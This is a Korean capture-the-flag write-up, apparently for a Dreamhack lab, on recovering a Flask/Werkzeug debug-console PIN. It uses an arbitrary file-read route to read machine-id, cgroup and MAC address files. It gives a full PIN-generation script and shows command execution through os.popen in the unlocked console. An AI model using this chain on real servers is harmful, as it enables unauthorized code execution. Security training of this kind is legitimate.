## 코드

```python
@app.route('/<path:file>')
def file(file):
	return open(file).read()

app.run(host='0.0.0.0', port=8000, threaded=True, debug=True)
```

## 풀이

예로부터 장고, 플라스크 개발하고 배포할 때 debug=True 무조건 False로 바꾸라고 했던 선조들의 말이 생각나는 문제..
그냥 막연히 정보가 노출되니 그런 줄 알았는데 구체적으로 이렇게 위험한지 몰랐다.

일단 코드를 보면 매우 간단하고, 유일한 기능은 path를 입력하면 해당 path의 파일을 열어볼 수 있는 것.
이를 통해 flag 파일을 열어볼 수 있지 않을까 싶지만 그렇게 허술할리 없지 flag는 실행파일이었다..

아무튼 이 상태에서 무슨 취약점이 있을까 했는데 바로 debug=True 때문에 발생하는 취약점이었다!
나는 그런 기능이 있는 줄 몰랐는데, debug=True를 해놓고 앱을 실행하면 debug-pin = 000-000-000 이런 식의 코드가 실행한 터미널에 출력된다. 이게 에러가 나타나는 웹페이지에서 코드를 선택하여 터미널을 연결하기 위한 보안키인 것이다..(werkzeug 모듈에서 나타나는 취약점이다.)

[https://www.daehee.com/werkzeug-console-pin-exploit/](https://www.daehee.com/werkzeug-console-pin-exploit/)

여기까지만 해도 몰랐던 기능이라 놀라운데, 심지어 이 pin code를 직접 구할 수도 있었다! 이를 구하는 코드가 

```
/usr/local/lib/python3.8/site-packages/werkzeug/debug/__init__.py
```

여기에 있었다. 알아보니 파이썬 버전마다 코드의 위치나 구현 방법이 다르다고 한다. 퍼즐이 끼워맞춰지는 것처럼 제시된 도커 파일에 파이썬 버전이 명시되어 있었고, 이를 통해 해당 경로를 통해 `__init__.py` 를 열어보면 아래와 같은 코드를 구할 수 있다.

```python
import hashlib
from itertools import chain

def generate_machine_code():
    linux = b""

    # machine-id is stable across boots, boot_id is not.
    for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
        try:
            with open(filename, "rb") as f:
                value = f.readline().strip()
        except IOError:
            continue

        if value:
            linux += value
            break

    # Containers share the same machine id, add some cgroup
    # information. This is used outside containers too but should be
    # relatively stable across boots.
    try:
        with open("/proc/self/cgroup", "rb") as f:
            linux += f.readline().strip().rpartition(b"/")[2]
    except IOError:
        pass

    if linux:
        return linux

def generate_pin_code():
    probably_public_bits = [
        'dreamhack', # username
        'flask.app',# modname 고정
        'Flask',    # getattr(app, '__name__', getattr(app.__class__, '__name__')) 고정
        '/usr/local/lib/python3.8/site-packages/flask/app.py' # getattr(mod, '__file__', None),
                                                            # python 버전 마다 위치 다름
    ]
    
    private_bits = [
        '187999308497153',  # MAC주소를 int형으로 변환한 값,  'aa:fc:00:00:16:01'
        b'c31eea55a29431535ff01de94bdcf5cflibpod-02f80dffdf6b5c197362e55ac6eae56e0b4c7c578407eb740c1ea5bbc6325bdb'   # get_machine_id()
    ]
    
    h = hashlib.md5()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')
    # h.update(b'shittysalt')
    
    cookie_name = '__wzd' + h.hexdigest()[:20]
    
    num = None
    if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]
    
    rv =None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                            for x in range(0, len(num), group_size))
                break
        else:
            rv = num
    
    print(rv)
```

이 코드를 실행시키기 위해 알아내야 하는 값들은 다음과 같다.

```python
probably_public_bits = [
    'dreamhack', # username
    'flask.app',# modname 고정
    'Flask',    # getattr(app, '__name__', getattr(app.__class__, '__name__')) 고정
    '/usr/local/lib/python3.8/site-packages/flask/app.py' # getattr(mod, '__file__', None),
                                                        # python 버전 마다 위치 다름
]

private_bits = [
    '187999308497153',  # MAC주소를 int형으로 변환한 값,  'aa:fc:00:00:16:01'
    b'c31eea55a29431535ff01de94bdcf5cflibpod-02f80dffdf6b5c197362e55ac6eae56e0b4c7c578407eb740c1ea5bbc6325bdb'   # get_machine_id()
]
```

username의 경우 마찬가지로 도커 파일에 있다. 나머지 값 3개는 고정이고, private_bits에서 필요한 값은 MAC 주소와 machine_id이다.

MAC 주소는 (이것도 몰랐지만) /sys/class/net/eth0/address 에서 구할 수 있다.
machine_id는 친절히 구할 수 있는 방법을 제시해주는데, 이것이 generate_machine_id() 함수이다. /etc/machine-id 파일과 /proc/self/cgroup 파일의 값을 합하면 된다. machine_id를 구하는 코드가 어렵지 않고 단순해서 다행이었다.

이를 통해 구한 값을 generate_pin_code() 에 설정하고 실행시키면 9자리 pin-code가 구해진다. 이를 문제 페이지의 pin-code 입력창에 넣으면 파이썬 인터프리터 쉘이 나타난다. 이때 파이썬 쉘이기 때문에 os.system()으로는 실행결과를 얻을 수 없으므로 eval("os.popen('ls').read()") 와 같은 방식으로 명령어를 실행시켜서 flag 파일의 위치와 실행 결과를 얻을 수 있다.